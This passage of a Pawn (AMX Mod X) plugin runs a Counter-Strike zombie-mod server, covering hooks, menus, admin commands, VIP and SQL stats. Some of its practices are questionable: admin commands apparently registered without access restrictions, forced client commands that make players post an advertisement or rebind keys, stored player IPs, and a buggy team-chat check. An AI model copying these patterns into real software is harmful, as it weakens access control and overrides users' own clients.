	client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1's rank is^4 %s^1 of ^4%s^1 --^3 %0.2f KPD", g_cName[iPlayer], cRank, cTotal, g_kpdRatio[iPlayer]);
	return 0;
}

public EmptyPanel(iPlayer, iMenu, iItem)
{
    return 0;
}

public plugin_init()
{
	new i = 0;
	new cNumber[3];
	new cLine[128];
	new cTime[4];
	get_time("%H", cTime, 3);	
	register_dictionary("common.txt");
	RegisterHam(Ham_Spawn, "player", "OnPlayerSpawn", 1);
	RegisterHam(Ham_TakeDamage, "player", "OnTakeDamage", 0);
	RegisterHam(Ham_TakeDamage, "player", "OnTakeDamagePost", 1);
	RegisterHam(Ham_Killed, "player", "OnKilled", 0);
	RegisterHam(Ham_Item_PreFrame, "player", "OnPreFrame", 1);
	RegisterHam(Ham_TraceAttack, "player", "OnTraceAttack", 0);
	RegisterHam(Ham_Touch, "weaponbox", "OnTouch");
	RegisterHam(Ham_Touch, "armoury_entity", "OnTouch");	
	RegisterHam(Ham_Touch, "weapon_shield", "OnTouch")
	RegisterHam(Ham_Think, "grenade", "OnGrenadeThink", 0);
	RegisterHam(Ham_Player_Jump, "player", "OnPlayerJump", 0);
	RegisterHam(Ham_TraceAttack, "player", "Golden_Ak_Tracer", 1 );	
	RegisterHam(Ham_TraceAttack, "player", "Golden_Deagle_Tracer", 1 );	
	RegisterHam(Ham_Think, "grenade", "fw_ThinkGrenade")
	register_forward(FM_SetModel, "fwSetModel");
	register_forward(FM_ClientUserInfoChanged, "fwdClientUserInfoChanged");
	register_forward(FM_GetGameDescription, "fwGetGameDescription");
	register_forward(FM_SetModel, "fw_SetModel");
	register_forward(FM_PlayerPreThink, "OnPlayerDuck");
	register_forward(FM_EmitSound, "fwEmitSound");
	register_forward(FM_PlayerPreThink, "PlayerPreThink" );
	register_forward(FM_UpdateClientData, "fw_UpdateClientData");
	register_forward(FM_TraceLine, "FW_TraceLine_Post", 1);
	register_forward(FM_PlayerPreThink, "FW_PlayerPreThink");
	register_forward(FM_ClientKill, "fwClientKill");
	register_think("zp_trip_mine", "Forward_Think");
	unregister_forward(FM_Spawn, iFwSpawnHook)
	register_logevent("EventRoundEnd", 2, "1=Round_End");
	register_logevent("EventRoundStart", 2, "1=Round_Start");	
	register_logevent("Event_RoundStart", 2, "1=Round_Start");
	register_event("HLTV", "EventHLTV", "a", "1=0", "2=0");
	register_event("StatusValue", "EventStatusValue", "be", "1=2", "2!0");
	register_event("StatusValue", "EventStatusValueHide", "be", "1=1", "2=0");
	register_event("CurWeapon", "EventCurWeapon", "be", "1=1");
	register_event("CurWeapon", "UpdateWeapon", "be", "1=1", "3=13", "3=15", "3=20", "3=25", "3=30", "3=35", "3=12", "3=10", "3=100", "3=8", "3=7", "3=50");
	register_event("DeathMsg", "OnDeathMsg", "a");	
	register_message(get_user_msgid("Scenario"), "MessageScenario");
	register_message(get_user_msgid("HostagePos"), "MessageHostagepos");
	register_message(get_user_msgid("Health"), "MessageHealth");
	register_message(get_user_msgid("Money"), "MessageMoney");
	register_message(get_user_msgid("TeamInfo"), "MessageTeamInfo");
	register_message(get_user_msgid("CurWeapon"), "message_cur_weapon");
	set_msg_block(get_user_msgid("TextMsg"), 2);
	set_msg_block(get_user_msgid("SendAudio"), 2);
	set_msg_block(get_user_msgid("AmmoPickup"), 2);
	set_msg_block(get_user_msgid("WeapPickup"), 2);
	g_iGameMenu = menu_create("Game Menu", "_GameMenu", 0);
	g_iSecondaryMenu = menu_create("Secondary Menu", "_SecondaryMenu", 0);
	g_iPrimaryMenu = menu_create("Primary Menu", "_PrimaryMenu", 0);	
	g_iMenuZombieClasses = menu_create("Zombie Classes", "_ZombieClasses", 0);
	menu_additem(g_iGameMenu, "Buy extra items", "0", 0, -1);
	menu_additem(g_iGameMenu, "Choose zombie class", "1", 0, -1);
	menu_additem(g_iGameMenu, "Buy features with points", "2", 0, -1);
	menu_additem(g_iGameMenu, "Unstuck", "3", 0, -1);
	menu_additem(g_iGameMenu, "See rank", "4", 0, -1);
	menu_additem(g_iGameMenu, "See top and all statistics", "5", 0, -1);
	i = 0;
	while (i < 7)
	{
        formatex(cLine, 128, "%s %s", g_cZombieClasses[i], g_cZombieAttribs[i]);
        num_to_str(i, cNumber, 3);
        menu_additem(g_iMenuZombieClasses, cLine, cNumber, 0, -1);
        i++;
	}	
	i = 0;
	while (i < 6)
	{
        num_to_str(i, cNumber, 3);
        menu_additem(g_iSecondaryMenu, g_cSecondaryWeapons[i], cNumber, 0, -1);
        g_iSecondaryWeapons[i] = get_weaponid(g_cSecondaryEntities[i]);
        i++;
	}
	i = 0;
	while (i < 10)
	{
        num_to_str(i, cNumber, 3);
        menu_additem(g_iPrimaryMenu, g_cPrimaryWeapons[i], cNumber, 0, -1);
        g_iPrimaryWeapons[i] = get_weaponid(g_cPrimaryEntities[i]);
        i++;
	}
	g_iTimeLimit = get_cvar_pointer("mp_timelimit");
	g_aNameData = ArrayCreate(32, 1);
	g_aAmmoData = ArrayCreate(1, 1);
	g_iAntidoteSync = CreateHudSyncObj(0);
	g_iTopMessageSync = CreateHudSyncObj(0);
	g_iCounterMessage = CreateHudSyncObj(0);
	g_iCenterMessageSync = CreateHudSyncObj(0);
	g_iDownMessageSync = CreateHudSyncObj(0);
	g_iVersusSync = CreateHudSyncObj(0);
	g_iShopEventHudmessage = CreateHudSyncObj(0);
	g_iEventsHudmessage = CreateHudSyncObj(0);
	g_iMineMessage = CreateHudSyncObj(0);
	g_iSecondMineMessage = CreateHudSyncObj(0);	
	g_iRemainingSync = CreateHudSyncObj(0);
	g_iRegenerationSync = CreateHudSyncObj(0);
	g_iMaxClients = get_maxplayers();
	register_concmd("amx_human", "CmdMode", -1, "", -1);
	register_concmd("amx_zombie", "CmdMode", -1, "", -1);
	register_concmd("amx_nemesis", "CmdMode", -1, "", -1);
	register_concmd("amx_swarm", "CmdMode", -1, "", -1);
	register_concmd("amx_plague", "CmdMode", -1, "", -1);
	register_concmd("amx_armageddon", "CmdMode", -1, "", -1);
	register_concmd("amx_nightmare", "CmdMode", -1, "", -1);
	register_concmd("amx_multiple", "CmdMode", -1, "", -1);
	register_concmd("amx_sniper", "CmdMode", -1, "", -1);
	register_concmd("amx_survivor", "CmdMode", -1, "", -1);
	register_concmd("amx_assassins_vs_snipers", "CmdMode", -1, "", -1);
	register_concmd("amx_assassin", "CmdMode", -1, "", -1);
	register_concmd("amx_respawn", "CmdMode", -1, "", -1);	
	register_concmd("amx_ammo", "CmdMode", -1, "", -1);
	register_concmd("amx_points", "CmdPoints", -1, "", -1);
	register_concmd("amx_plugins", "cmdPlugins", -1, "", -1);
	register_concmd("amx_kick", "CmdKick", -1, "", -1);
	register_concmd("amx_slay", "CmdSlay", -1, "", -1);
	register_concmd("amx_freeze", "CmdFreeze", -1, "", -1);
	register_concmd("amx_unfreeze", "CmdUnfreeze", -1, "", -1);
	register_concmd("amx_destroy", "CmdDestroy", -1, "", -1);
	register_concmd("amx_gag", "CmdGag", -1, "", -1);
	register_concmd("amx_ungag", "CmdGag", -1, "", -1);
	register_concmd("amx_slap", "CmdSlap", -1, "", -1);
	register_concmd("amx_map", "CmdMap", -1, "", -1);
	register_concmd("amx_exec", "CmdExec", -1, "", -1);
	register_concmd("amx_last", "CmdLast", -1, "", -1);
	register_concmd("amx_ban", "CmdBan", -1, "", -1);
	register_concmd("amx_unban", "CmdUnBan", -1, "", -1);
	register_concmd("amx_addban", "CmdAddBan", -1, "", -1);
	register_concmd("amx_chat", "CmdChat", -1, "", -1);
	register_concmd("amx_say", "CmdSayChat", -1, "", -1);
	register_clcmd("say_team", "Client_SayTeam", -1, "", -1);
	register_clcmd("drop", "CmdDrop", -1, "", -1);
	register_clcmd("cl_setautobuy", "CmdBlock", -1, "", -1);
	register_clcmd("cl_setrebuy", "CmdBlock", -1, "", -1);	
	register_clcmd("amx_password_for_slot", "CommandGetSlot", -1, "", -1);
	register_clcmd("amx_password_for_model", "CommandGetModel", -1, "", -1);	
	register_clcmd("plant_mine", "CmdPlantMine", -1, "", -1);
	register_clcmd("take_mine", "CmdTakeMine", -1, "", -1);	
	register_clcmd("nightvision", "CmdNightVision", -1, "", -1);
	register_clcmd("jointeam", "CmdJoinTeam", -1, "", -1);
	register_clcmd("chooseteam", "CmdJoinTeam", -1, "", -1);	
	register_clcmd("say", "Client_Say", -1, "", -1);
	register_clcmd("say", "ClientCommand_Say", -1, "", -1);
	register_clcmd("say_team", "ClientCommand_Say", -1, "", -1);
	register_clcmd("cl_autoupdate", "CmdUpdate", -1, "", -1);
	register_clcmd("fullupdate", "CmdUpdate", -1, "", -1);
	register_clcmd("fullupdaterate", "CmdUpdate", -1, "", -1);	
	register_cvar("amx_vote_ratio", "0.02")
	register_cvar("amx_show_activity", "2")
	register_cvar("amx_time_voice", "1")
	register_cvar("amx_client_languages", "0")
	register_cvar("amx_debug", "1")
	register_cvar("amx_vote_time", "10")
	register_cvar("amx_vote_answers", "1")
	register_cvar("amx_vote_delay", "60")
	register_cvar("amx_last_voting", "0")
	register_cvar("amx_votemap_ratio", "0.40")
	set_cvar_float("amx_last_voting", 0.0)
	set_task(0.01, "TaskAxaxa", 0, "", 0, "", 0);
	set_task(10.0, "Rays", .flags="b");
	set_task(5.0, "TaskLight", 0, "", 0, "b", 0);
	set_task(6.20, "TaskHudMess", 0, "", 0, "", 0);
	set_task(33.50, "TaskAdvertisements", 0, "", 0, "b", 0);
	new cfgs[128];
	get_configsdir(cfgs, 127)
	add(cfgs, 127, "/vips.ini")

	new file = fopen(cfgs, "r")
	if (file)
	{
		new line[512], name[64], pwd[64], flags[64]

		while (!feof(file))
		{
			fgets(file, line ,511)
			trim(line)
			if (!line[0] || line[0] == '/' || line[0] == ';' || line[0] == '#')
				continue;
			new r=parse(line, name,63,pwd,63,flags,63)
			if (r < 3) continue;
			ArrayPushString(g_vname, name)
			ArrayPushString(g_vpwd, pwd)
			ArrayPushString(g_vflags, flags)
		}

		fclose(file)
	}
	g_Tuple = SQL_MakeDbTuple(SQL_Server, SQL_Person, SQL_Password, SQL_Database);
	if (g_Tuple == Empty_Handle)
	{
		g_Tuple = SQL_MakeDbTuple(SQL_Server, SQL_Person, SQL_Password, SQL_Database);

		if (g_Tuple == Empty_Handle)
		{
			log_to_file("ZombieOutStanding_Stats_Error.log", "SQL_MakeDbTuple() failed @ plugin_init()");

			return set_fail_state("SQL_MakeDbTuple() failed @ plugin_init()");
		}
	}
	SQL_ThreadQuery(g_Tuple, "emptyFunction", "CREATE TABLE IF NOT EXISTS Players \
		(Name TEXT, Steam TEXT, Ip TEXT, Score NUMERIC, Kills NUMERIC, Deaths NUMERIC, \
		headShots NUMERIC, Time NUMERIC, timeString TEXT, Seen NUMERIC, seenString TEXT, kpdRatio FLOAT, \
		kmdValue NUMERIC);");
	SQL_ThreadQuery(g_Tuple, "recordsCount", "SELECT Kills FROM Players");	
	return 0;
}

public fwdClientUserInfoChanged( id, szInfoKey )
{
	if ( is_user_connected( id ) ) 
		return FMRES_IGNORED;
	static szNewName[ 32 ];
	static szCurrentName[ 32 ];
	get_user_name( id, szCurrentName, sizeof ( szCurrentName ) -1 );
	engfunc( EngFunc_InfoKeyValue, szInfoKey, "name", szNewName, sizeof ( szNewName ) - 1 );
	
	if( equal( szNewName, szCurrentName ) )
		return FMRES_IGNORED;
	for( new i = 0; i < sizeof ( g_szRestrictedThings ); i++ )
		if( containi( szNewName, g_szRestrictedThings[ i ] ) != -1 )
			engfunc( EngFunc_SetClientKeyValue, id, szInfoKey, "name", g_szDefaultName );
			
	return FMRES_SUPERCEDE;
}

public plugin_cfg()
{
	set_task( 0.5, "ReadCommandVars", 3426422 );
}

public ReadCommandVars( )
{
	g_iPing = clamp( 12, 0, 4095 );
	g_iFlux = clamp( 4, 0, 4095 );
	
	set_task( 2.0, "calculate_arguments", 4235621, _, _, "b" );
}

public plugin_natives()
{
	register_library("NewStats");
	register_native("NewStats_GetStats", "NewStats_GetStats");
	register_native("NewStats_GetTop15", "NewStats_GetTop15");
}

public TaskHudMess()
{
	new iFile;
	new cLine[161];
    iFile = fopen("addons/amxmodx/configs/z_out_advertisements.ini", "r");
    if (iFile)
    {
        while (!feof(iFile))
        {
            fgets(iFile, cLine, 160);
            trim(cLine);
            if (cLine[0] == 33)
            {
                copy(g_cAdvertisements[g_iAdvertisementsCount], 160, cLine);
                replace_all(g_cAdvertisements[g_iAdvertisementsCount], 160, "!g", "^4");
                replace_all(g_cAdvertisements[g_iAdvertisementsCount], 160, "!t", "^3");
                replace_all(g_cAdvertisements[g_iAdvertisementsCount], 160, "!n", "^1");
                g_iAdvertisementsCount += 1;
            }
        }
        fclose(iFile);
    }
    iFile = fopen("addons/amxmodx/configs/z_out_hud_advertisements.ini", "r");
    if (iFile)
    {
        while (!feof(iFile))
        {
            fgets(iFile, cLine, 160);
            trim(cLine);
            if (4 < strlen(cLine))
            {
                copy(g_cHudAdvertisements[g_iHudAdvertisementsCount], 160, cLine);
                replace_all(g_cHudAdvertisements[g_iHudAdvertisementsCount], 160, "\n", "^n");
                g_iHudAdvertisementsCount += 1;
            }
        }
        fclose(iFile);
    }
    return 0;
}


public TaskCheckName( id )
{
	if (g_bConnected[id])
	{
        new szName[ 32 ];
        get_user_name( id, szName, sizeof ( szName ) -1 );
	
        for( new i = 0; i < sizeof ( g_szRestrictedThings ); i++ )
        {
            if( containi( szName, g_szRestrictedThings[ i ] ) != -1 )
            {
                set_user_info( id, "name", g_szDefaultName );	
            }
        }
	}
	return 0;
}

public CmdBlock()
{
	return 1;
}

public CmdUpdate(iPlayer)
{
	static Float:fGameTime;
	fGameTime = get_gametime();
	if (floatsub(fGameTime, g_fLast[iPlayer]) < 0.30)
	{
		server_cmd("kick #%d  You are banned due to flooding!; addip 60 %s; writeip", get_user_userid(iPlayer), g_cPlayerAddress[iPlayer]);
	}
	else
	{
		g_fLast[iPlayer] = fGameTime;
	}
	return 0;
}

public ChangeModel(iTask)
{
	static bool:bChange;
	static cModel[24];
	static i;
	static iPlayer;
	iPlayer = iTask + -250;
	bChange = true;
	cs_get_user_model(iPlayer, cModel, 24);
	if (!g_bZombie[iPlayer])
	{
		if (!g_iPlayerType[iPlayer])
		{
			if (get_user_flags ( iPlayer ) & read_flags ( "m" ) && !g_vip[iPlayer])
			{
				if (equal(cModel, "z_out_admin"))
				{
					bChange = false;
				}
			}
			if (g_vip[iPlayer])
			{
				if (equal(cModel, "DanDiaconescu"))
				{
					bChange = false;
				}
			}
			i = 0;
			while (i < 4)
			{
				if (equal(cModel, g_cHumanModels[i], 0))
				{
					bChange = false;
				}
				i += 1;
			}		
		}
	}
	if (bChange)
	{
		if (!g_bZombie[iPlayer])
		{
			if (!g_iPlayerType[iPlayer])
			{
				if (get_user_flags ( iPlayer ) & read_flags ( "m" ) && !g_vip[iPlayer])
				{
					cs_set_user_model(iPlayer, "z_out_admin");
				}
				else
				{
					if (g_vip[iPlayer])
					{
						cs_set_user_model(iPlayer, "DanDiaconescu");
					}
                                        else
                                        {
						cs_set_user_model(iPlayer, g_cHumanModels[random_num(0, 3)]);
					}
				}
			}
			else
			{
				if (g_iPlayerType[iPlayer] & 4)
				{
					cs_set_user_model(iPlayer, "z_out_survivor");
				}
				if (g_iPlayerType[iPlayer] & 8 && !equal(cModel, "arctic"))
				{
					cs_set_user_model(iPlayer, "arctic");
				}
			}
		}
		else
		{
			if (!g_iPlayerType[iPlayer])
			{
				cs_set_user_model(iPlayer, g_cZombieModels[g_iZombieClass[iPlayer]]);
			}
			if (g_iPlayerType[iPlayer] & 1)
			{
				cs_set_user_model(iPlayer, "z_out_nemesis");
			}
			if (g_iPlayerType[iPlayer] & 2)
			{
				cs_set_user_model(iPlayer, "z_out_assassin");
			}
		}
	}
	return 0;
}

public TaskAxaxa()
{
	new iFile = fopen("addons/amxmodx/configs/RegisteredCharacter.ini", "r");
	if (iFile)
	{
		fgets(iFile, g_cRegisteredCharacter, 31);
		trim(g_cRegisteredCharacter);
		formatex(g_Secret, 31, "%s", g_cRegisteredCharacter);
		format(g_cRegisteredCharacter, 31, "(Gold Member %s) ", g_cRegisteredCharacter);
		fclose(iFile);
	}
	return 0;
}

public ShowMenuClasses(iPlayer)
{
    if (!g_bFake[iPlayer])
    {
        menu_display(iPlayer, g_iMenuZombieClasses, 0);
    }
    return 0;
}

public Client_Say(iPlayer)
{
	static cMessage[150];
	static name[32];
	static motd[2048];
	static len = 0;
	static queryData[32] = { 0, ... }
	static Float:fGameTime;
	fGameTime = get_gametime();	
	if (g_fGagTime[iPlayer] > fGameTime)
	{
		return 1;
	}	
	read_args(cMessage, 149);
	remove_quotes(cMessage);
	if (equali(cMessage, "/rank", 5) || equali(cMessage, "rank", 4))
	{
		if (!g_bRanked[iPlayer])
		{
			client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You are not ranked yet!");
		}
		else
		{
			if (floatsub(fGameTime, g_fLastRankQuery) < 3.0)
			{
				client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You have to wait^3 %0.1f seconds^1 until next command!", g_fLastRankQuery + 3.00 - fGameTime);
			}
			g_fLastRankQuery = fGameTime;			
			num_to_str(iPlayer, queryData, charsmax(queryData));

			formatex(g_Query, charsmax(g_Query), "SELECT DISTINCT kmdValue FROM Players WHERE kmdValue >= %d ORDER BY kmdValue ASC;", g_kmdValue[iPlayer]);

			SQL_ThreadQuery(g_Tuple, "printRankChat", g_Query, queryData, sizeof(queryData));
		}
	}
	else
	{	
		if (equali(cMessage, "/gold", 5) || equali(cMessage, "/vip", 4) || equali(cMessage, "vip", 3) || equali(cMessage, "gold", 4))
		{
			new Text[1501];
			add(Text, 1500, "<body bgcolor=#000000><font color=AAE500><pre>Contact Skype :  robythedude<br><br>Monthly Price  |  Pret Lunar :  5 EUR   7 USD   25 RON<br><br>Features  |  Caracteristici<br>* Higher Damage ", 0);
			add(Text, 1500, "+ More Ammo Packs  |  Mai Multe Daune + Mai Multe Pachete Ammo<br>* +200 Health in Spawn  |  +200 Viata la Spawn<br>* +50 Armor in Spawn  |  +50 Armura la Spawn<br>* Double Jump in Spawn  |  Saritura Dubla din Spawn<br>* Special Laser ", 0);
			add(Text, 1500, "Rays -- Ability to View Through Walls  |  Raze Laser Speciale -- Abilitate sa Vezi Prin Pereti<br>* White Player Model  |  Model Alb de Jucator<br>* VIP Tag in Score Table  |  Tag VIP in Tabla de Scoruri</pre></font></body>", 0);
			show_motd(iPlayer, Text, "Gold Member Info");
		}	
		if (equali(cMessage, "/top", 4) || equali(cMessage, "top", 3))
		{
		}	
		if (equali(cMessage, "/maps", 0) || equali(cMessage, "maps", 0))
		{
			len = formatex(motd, charsmax(motd), "<body bgcolor=#000000><center><font color=red size=4><b>* MAPS *</b></font><br />");

			new file=fopen("addons/amxmodx/configs/maps.ini","r");
			if (file)
			{
			    while (!feof(file))
			    {
					fgets(file,name,31)
					trim(name);
					if (strlen(name)<1||name[0]=='/'||name[0]=='#'||name[0]==';')
					continue

					len += formatex(motd[len], charsmax(motd) - len, "<font color=gray size=3><b>%s</b></font><br />", name);
			    }
			    fclose(file);
			}

			len += formatex(motd[len], charsmax(motd) - len, "</center></body>");

			show_motd(iPlayer, motd, "Server's Maps");
		}
		if (equali(cMessage, "/rs", 3) || equali(cMessage, "Rs", 2) || equali(cMessage, "Reset", 5) || equali(cMessage, "Reset", 5))
		{
			get_user_name(iPlayer, name, charsmax(name));

			set_user_frags(iPlayer, 0);
			cs_set_user_deaths(iPlayer, 0);

			set_user_frags(iPlayer, 0);
			cs_set_user_deaths(iPlayer, 0);

			client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 has reset their score!", name);
		}		
		if (equali(cMessage, "/timeleft", 0) || equali(cMessage, "timeleft", 0))
		{
			static iTimeleft;
			iTimeleft = floatround(GetTimeLeft(), floatround_round);
			if (!get_cvar_num("mp_timelimit"))
			{
				client_print_color(iPlayer, print_team_grey, "^1Time left:^4 [no time limit]");
			}
			else
			{
				if (get_cvar_num("mp_timelimit") == 4096)
				{
					client_print_color(iPlayer, print_team_grey, "^1Time left:^4 [this is the last round]");
				}
				if (0 < iTimeleft)
				{
					client_print_color(iPlayer, print_team_grey, "^1Time left:^4 %d:%02d", iTimeleft / 60, iTimeleft % 60);
				}
				else
				{
					client_print_color(iPlayer, print_team_grey, "^1Time left:^4 [this is the last round]");
				}
			}
		}
		if (equali(cMessage, "/nextmap", 0) || equali(cMessage, "nextmap", 0))
		{
			static cMap[32];
			get_cvar_string("nextmap", cMap, 32);
			if (cMap[0])
			{
				client_print_color(iPlayer, print_team_default, "^1Next map:^4 %s", cMap);
			}
			else
			{
				client_print_color(iPlayer, print_team_default, "^1Next map:^4 [not yet voted on]");
			}
		}
		if (equali(cMessage, "/thetime", 0) || equali(cMessage, "thetime", 0))
		{
            static cTime[64];
            get_time("%d/%m/%Y - %H:%M:%S", cTime, 63);
            client_print_color(0, print_team_grey, "^1The Time:^1  %s", cTime);
		}	
		if (equali(cMessage, "/currentmap", 0) || equali(cMessage, "currentmap", 0))
		{
            static cMap[32];
            get_mapname(cMap, 32);
            client_print_color(0, print_team_grey, "Current map:^4 %s", cMap);
		}	
		if (equali(cMessage, "/donate", 7) || equali(cMessage, "donate", 6))
		{
            new args[128];
            read_args(args, 127)
            trim(args)
            remove_quotes(args)
            trim(args)
	
            new val[32], target[32], ammo[32], plr;
            new res = parse(args, val, 31, target, 31, ammo, 31)
	
            if (res != 3)
            return 0;
            if (!equali(val, "donate") && !equali(val[1], "donate"))
            return 0;

            plr = cmd_target(iPlayer,target, 0)

            if (!plr)
            {
				client_print_color ( iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Invalid target.")
				return 1
            }
	
            new amount = str_to_num(ammo)
            if (amount < 1)
            {
				client_print_color ( iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Invalid amount.")
				return 1
            }

            if (amount > g_iPacks[iPlayer])
            {
				client_print_color ( iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs.")
				return 1
            }
		
            g_iPacks[plr] += amount
            g_iPacks[iPlayer] -= amount
	
            new ammostr[32]
            AddCommas(amount, ammostr, 31)
            client_print_color ( 0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 donated^4 %s ammo^1 to^3 %s", g_cName[iPlayer], ammostr, g_cName[plr])
            return 1;
		}
		if (equal(cMessage, "/lm", 0) || equal(cMessage, "lm", 0))
		{		
			if (!g_bAlive[iPlayer] || g_bZombie[iPlayer] || g_iRoundType & 128 || g_iRoundType & 256 || g_iRoundType & 512)
			{
		        client_print_color ( iPlayer, print_team_default, "^4[Zombie Outstanding]^1 Mines are unavailable right now!");
		        return 0;
			}
			else
			{	
			    if ( g_iPacks [iPlayer] < 5 )
			    {
				    client_print_color ( iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You need at least^4 5 ammo packs");
				    return 0;
			    }
			    g_iPacks [iPlayer] -= 5;
			    g_iTripMines [iPlayer]++;
			    client_print_color ( iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Press^3 P^1 to plant it or^3 V^1 to take it!");
			    client_cmd(iPlayer, "bind p plant_mine; bind v take_mine");
			    return 0;
			}
		}
	}
	return 0;
}

public Client_SayTeam ( id )
{
	if ( read_argc (  ) < 2 ) return PLUGIN_HANDLED;
	
	static Float:fGameTime;
	
	fGameTime = get_gametime();
	
	if (g_fGagTime[id] > fGameTime)
	{
		return 1;
	}	
	new Said [2]; read_argv ( 1, Said, charsmax ( Said ) );
	
	if ( Said [0] != '@' ) return PLUGIN_CONTINUE;
	
	new Message [192]; read_args ( Message, charsmax ( Message ) );
	
	remove_quotes ( Message );
	
	new Players [32], Num;
	
	if ( get_user_flags ( id ) & read_flags ( "f" ))
	
	format ( Message, charsmax ( Message ), "^4[ADMINS]^3 %s^1 :%s", GetInfoPlayer ( id, INFO_NAME ), Message [1] );
	
	else
		
	format ( Message, charsmax ( Message ), "^3(PLAYER) %s^1 :%s", GetInfoPlayer ( id, INFO_NAME ), Message [1] );

	get_players ( Players, Num );
	
	for ( new i = 0; i < Num; ++ i )
	{
		if ( Players [i] != id && read_flags ("f") )
		
		client_print_color ( Players [i], print_team_grey, "%s", Message );
	}
	
	client_print_color ( id, print_team_grey, "%s", Message );	
	return PLUGIN_HANDLED;
}

public ClientCommand_Say( id )
{
	static cPhrase[ 192 ], i;
	read_args( cPhrase, 191 );

	if( containi( cPhrase, "CsOutStanding.Com" ) != -1 )
		return PLUGIN_CONTINUE;

	for(i = 0; i < sizeof ( g_szRestrictedThings ); i++)
	{
		if( containi( cPhrase, g_szRestrictedThings[ i ] ) != -1 )
		{
			client_cmd( id, "say NewLifeZm.CsOutStanding.Com" );

			return PLUGIN_HANDLED;
		}
	}

	return PLUGIN_CONTINUE;
}

public _GameMenu(iPlayer, iMenu, iItem)
{
    if (iItem != -3 && !g_bFake[iPlayer] && g_bConnected[iPlayer])
    {
        static iChoice;
        static iDummy;
        static cBuffer[3];
        menu_item_getinfo(iMenu,iItem, iDummy, cBuffer, charsmax ( cBuffer ), _, _, iDummy );
        iChoice = str_to_num(cBuffer);
        switch (iChoice)
        {
            case 0:
            {
                if (g_bAlive[iPlayer] && !g_iPlayerType[iPlayer])
                {
					static cNumber[3];
					static cLine[128];
					static i;
					g_iMenuExtraItems = menu_create("Extra Items", "_ExtraItems", 0);
					i = 0;
					while (i < 25)
					{
						if (g_iExtraItemsTeams[i] == 1 && !g_bZombie[iPlayer])	
						{
						}
						else
						{
							if (!(g_bZombie[iPlayer] && g_iExtraItemsTeams[i] == 2))
							{
								formatex(cLine, 128, "%s %s", g_cExtraItems[i], g_cExtraItemsPrices[i]);
								num_to_str(i, cNumber, 3);
								menu_additem(g_iMenuExtraItems, cLine, cNumber, 0, -1);
							}
						}
						i += 1;
					}
					menu_display(iPlayer, g_iMenuExtraItems, 0);
				}
                else
                {
                    client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Extra items are unavailable right now...");
                }
            }
            case 1:
            {
                menu_display(iPlayer, g_iMenuZombieClasses, 0);
            }
            case 2:
            {
                static cNumber[3];
                static cLine[128];
                static i;
                g_iShopMenu = menu_create("Shop Menu", "_ShopMenu", 0);
                i = 0;
                while (i < 8)
                {
                    if (g_iShopItemsTeams[i] == 2 && g_bZombie[iPlayer])
                    {
                    }
                    else
                    {
                        formatex(cLine, 128, "%s %s", g_cShopItems[i], g_cShopItemsPrices[i]);
                        num_to_str(i, cNumber, 3);
                        menu_additem(g_iShopMenu, cLine, cNumber, 0, -1);
                    }
                    i += 1;
                }
                menu_display(iPlayer, g_iShopMenu, 0);
            }
            case 3:
            {
				if (g_bAlive[iPlayer])
                {
                    if (is_player_stuck(iPlayer))
                    {
                        client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You have been unstucked!")
                        static players[32], pnum , Float:origin[3], Float:mins[3], hull, Float:vec[3], o , i
                        get_players(players, pnum)
 
                        for(i=0; i<pnum; i++)
                        {
                            iPlayer = players[i]
                            if (is_user_connected(iPlayer) && is_user_alive(iPlayer)) 
                            {
                                pev(iPlayer, pev_origin, origin)
                                hull = pev(iPlayer, pev_flags) & FL_DUCKING ? HULL_HEAD : HULL_HUMAN
                                if (!unstuck_is_hull_vacant(origin, hull,iPlayer) && !get_user_noclip(iPlayer) && !(pev(iPlayer,pev_solid) & SOLID_NOT))
                                {
                                    ++on_stuck[iPlayer]
                                    if(on_stuck[iPlayer] >= 1)
                                    {
                                        pev(iPlayer, pev_mins, mins)
                                        vec[2] = origin[2]
                                        for (o=0; o < sizeof sizez; ++o) 
                                        {
                                            vec[0] = origin[0] - mins[0] * sizez[o][0]
                                            vec[1] = origin[1] - mins[1] * sizez[o][1]
                                            vec[2] = origin[2] - mins[2] * sizez[o][2]
                                            if (unstuck_is_hull_vacant(vec, hull,iPlayer))
                                            {
                                                engfunc(EngFunc_SetOrigin, iPlayer, vec)
                                                client_cmd(iPlayer,"spk fvox/blip.wav")    
                                                set_pev(iPlayer,pev_velocity,{0.0,0.0,0.0})
                                                o = sizeof sizez
                                            }
                                        }
                                    }
                                }
                                else
                                {
                                    on_stuck[iPlayer] = 0
                                }
                            }
                        }
                    }
                    else
                    client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You are dead or your are not stuck...")
                }
            }  	
            case 4:
			{
				static queryData[32] = { 0, ... };
				if (!g_bRanked[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You are not ranked yet!");
				}
				else
				{		
					num_to_str(iPlayer, queryData, charsmax(queryData));

					formatex(g_Query, charsmax(g_Query), "SELECT DISTINCT kmdValue FROM Players WHERE kmdValue >= %d ORDER BY kmdValue ASC;", g_kmdValue[iPlayer]);

					SQL_ThreadQuery(g_Tuple, "printRankChat", g_Query, queryData, sizeof(queryData));
				}
			}			
            case 5:
            {
				client_cmd(iPlayer, "say /top")
			}
			default:
			{
			}
        }
    }
    return PLUGIN_HANDLED;
}

public OnPlayerDuck ( id )
{
	if ( !g_bAlive [id] ) return;
	
	if ( g_bZombie [id] && g_iPlayerType[id] & 1 && g_iPlayerType[id] & 2)
		
	set_pev ( id, pev_flTimeStepSound, 999 );
	
	if ( g_bFrozen [id])
	{
		set_pev ( id, pev_velocity, Float: {0.0,0.0,0.0} );
		
		set_pev ( id, pev_maxspeed, 1.0 );
		
		return;
	}
	else if ( FreezeTime )
	{
		return;
	}	
	else
	{
		if ( g_bZombie [id] )
		{
			if ( g_iPlayerType[id] & 1 )
			
			set_pev ( id, pev_maxspeed, 250.0 );
			
			else if (  g_iPlayerType[id] & 2 )
			
